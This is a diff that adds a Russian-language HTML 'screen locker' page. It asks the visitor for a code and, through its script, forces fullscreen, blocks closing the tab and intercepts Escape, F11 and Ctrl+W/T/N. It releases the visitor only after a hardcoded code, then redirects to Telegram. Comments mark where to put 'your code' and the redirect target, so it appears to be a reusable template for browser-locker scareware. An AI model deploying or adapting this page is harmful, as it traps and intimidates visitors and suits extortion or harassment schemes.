@@ -1,0 +1,99 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Проверка</title>
+<style>
+body {
+margin: 0;
+background: #0a0a0a;
+color: #eee;
+font-family: monospace;
+display: flex;
+align-items: center;
+justify-content: center;
+height: 100vh;
+}
+#box {
+text-align: center;
+padding: 20px;
+}
+input {
+padding: 10px;
+font-size: 18px;
+text-align: center;
+background: #111;
+color: #0f0;
+border: 1px solid #333;
+border-radius: 4px;
+outline: none;
+}
+button {
+margin-top: 15px;
+padding: 10px 20px;
+background: #c00;
+color: #fff;
+border: 0;
+border-radius: 4px;
+cursor: pointer;
+font-size: 16px;
+}
+button:hover {
+background: #a00;
+}
+#msg {
+color: #f00;
+font-weight: bold;
+margin-top: 10px;
+}
+</style>
+</head>
+<body>
+<div id="box">
+<h2>Введите код для продолжения</h2>
+<input id="code" placeholder="XXXX-XXXX" autofocus>
+<br>
+<button onclick="check()">Проверить</button>
+<p id="msg"></p>
+</div>
+<script>
+// 1. Попытка включить полноэкранный режим при клике
+document.body.addEventListener('click', () => {
+if (!document.fullscreenElement) {
+document.documentElement.requestFullscreen().catch(()=>{});
+}
+});
+
+// 2. Предупреждение при закрытии вкладки
+window.addEventListener('beforeunload', (e) => {
+e.preventDefault();
+e.returnValue = '';
+});
+
+// 3. Блокировка клавиш выхода (Esc, F11, Ctrl+W и т.д.)
+document.addEventListener('keydown', (e) => {
+if (['Escape','F11'].includes(e.key) || (e.ctrlKey && ['w','W','t','T','n','N'].includes(e.key))) {
+e.preventDefault();
+e.stopPropagation();
+}
+});
+
+// 4. Проверка кода
+function check(){
+const v = document.getElementById('code').value.trim();
+if (v === '1234-ABCD') { // <--- ТУТ ТВОЙ КОД
+document.getElementById('msg').style.color = '#0f0';
+document.getElementById('msg').textContent = 'OK, отпускаю...';
+setTimeout(()=>{
+if (document.exitFullscreen) document.exitFullscreen().catch(()=>{});
+location.href = 'https://t.me'; // <--- Куда перекинуть после ввода
+}, 800);
+} else {
+document.getElementById('msg').style.color = '#f00';
+document.getElementById('msg').textContent = 'Неверный код';
+}
+}
+</script>
+</body>
+</html>
